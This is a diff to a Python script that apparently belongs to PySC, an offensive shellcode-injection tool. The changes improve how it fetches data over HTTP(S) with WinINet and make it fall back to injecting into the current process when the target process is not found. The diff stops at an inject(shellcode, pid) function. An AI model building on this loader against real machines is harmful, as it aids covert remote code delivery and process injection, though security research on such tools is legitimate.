@@ -1,4 +1,4 @@
-﻿#!/usr/bin/python
+#!/usr/bin/python
 # -*- coding: utf-8 -*-
 
 #
@@ -328,20 +328,28 @@ def urlrequest(url, check_url):
 
         INTERNET_OPEN_TYPE_PRECONFIG = 0
         INTERNET_SERVICE_HTTP = 3
+        INTERNET_FLAG_RELOAD = 0x80000000
+        INTERNET_FLAG_CACHE_IF_NET_FAIL = 0x00010000
         INTERNET_FLAG_NO_CACHE_WRITE = 0x04000000
+        INTERNET_FLAG_PRAGMA_NOCACHE = 0x00000100
         HTTP_QUERY_FLAG_NUMBER = 0x20000000
         HTTP_QUERY_STATUS_CODE = 19
+        INTERNET_DEFAULT_HTTP_PORT = 80
+        INTERNET_DEFAULT_HTTPS_PORT = 443
         dwStatus = DWORD()
         dwBufLen = DWORD(4)
         buff = c_buffer(0x2000)
         bytesRead = DWORD()
         data = ''
         useragent = 'Mozilla/5.0 PySC'
+        method = 'GET'
 
         if debug:
             print '\n [>] Checking URL'
 
         p_url = urlparse(url)
+        path = p_url.path
+        netloc = p_url.netloc
 
         try:
             hInternet = wininet.InternetOpenA(
@@ -357,16 +365,28 @@ def urlrequest(url, check_url):
                     print ' [!] Unable to build connection to %s' % p_url.geturl()
                 raise Exception
 
-            hConnect = wininet.InternetConnectA(
-                        hInternet,
-                        p_url.netloc,
-                        False,
-                        False,
-                        False,
-                        INTERNET_SERVICE_HTTP,
-                        False,
-                        False,
-                        )
+            if p_url.scheme == 'http':
+                hConnect = wininet.InternetConnectA(
+                            hInternet,
+                            p_url.netloc,
+                            INTERNET_DEFAULT_HTTP_PORT,
+                            False,
+                            False,
+                            INTERNET_SERVICE_HTTP,
+                            False,
+                            False,
+                            )
+            else:
+                hConnect = wininet.InternetConnectA(
+                            hInternet,
+                            p_url.netloc,
+                            INTERNET_DEFAULT_HTTPS_PORT,
+                            False,
+                            False,
+                            INTERNET_SERVICE_HTTP,
+                            False,
+                            False,
+                            )
 
             if not hConnect:
                 if debug:
@@ -375,12 +395,13 @@ def urlrequest(url, check_url):
 
             hRequest = wininet.HttpOpenRequestA(
                         hConnect,
-                        'GET',
+                        method,
                         p_url.path,
                         False,
                         False,
                         False,
-                        INTERNET_FLAG_NO_CACHE_WRITE,
+                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | \
+                            INTERNET_FLAG_CACHE_IF_NET_FAIL | INTERNET_FLAG_PRAGMA_NOCACHE,
                         False,
                         )
 
@@ -425,7 +446,7 @@ def urlrequest(url, check_url):
             hRead = wininet.InternetReadFile(
                     hRequest,
                     buff,
-                    0x2000,
+                    len(buff),
                     byref(bytesRead),
                     )
 
@@ -484,15 +505,19 @@ def getpid(process):
                             print ' [>] Process: %s has a PID number of %s' % (process, pid)
                         return pid
                         break
+                if not pid:
+                        if debug:
+                            print ' [!] Process %s not found' % process
+                        raise Exception
             except:
                 pid = kernel32.GetCurrentProcessId()
                 if debug:
                     print ' [!] Cannot find pid of requested process, injecting into current PID'
                 return pid
     else:
-    
+
         # pid set at command-line
-        
+
         return pid
 
 def inject(shellcode, pid):
